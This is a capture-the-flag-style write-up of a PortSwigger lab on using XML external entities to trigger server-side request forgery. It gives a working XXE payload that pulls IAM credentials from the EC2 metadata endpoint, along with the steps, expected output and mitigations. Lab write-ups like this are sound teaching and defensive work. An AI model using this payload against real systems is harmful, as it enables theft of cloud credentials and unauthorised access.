# 🛡️ Lab: Exploiting XXE to Perform SSRF

**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
**Category:** XML External Entity (XXE)  
**Difficulty:** 🟦 Apprentice  
**Lab Goal:** Use an XXE vulnerability to perform a server-side request forgery (SSRF) and retrieve the EC2 IAM secret access key from the metadata service.

## ⚙️ Steps to Reproduce

1. Visit any product page and click the **"Check stock"** button.
2. Intercept the **POST request** using **Burp Suite**.
3. Modify the XML to inject an external entity definition targeting the EC2 metadata endpoint.

## 🔧 Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

> Insert the DOCTYPE just before the `<stockCheck>` tag.

## ✅ Expected Result

- The server reads the entity value from the internal endpoint.
- You should see IAM credentials such as:
  - `AccessKeyId`
  - `SecretAccessKey`
  - `Token`


##  Key Takeaway

This lab demonstrates how a simple XXE flaw can lead to SSRF, allowing attackers to access internal-only resources such as cloud metadata services, leading to cloud credential theft.


## Mitigation

- Disable DTD processing in your XML parsers.
- Use safe data formats like JSON when possible.
- Always validate and sanitize user input.

##  Author

`vgod-sec`  
🔗 GitHub: [https://github.com/vgod-sec](https://github.com/vgod-sec)
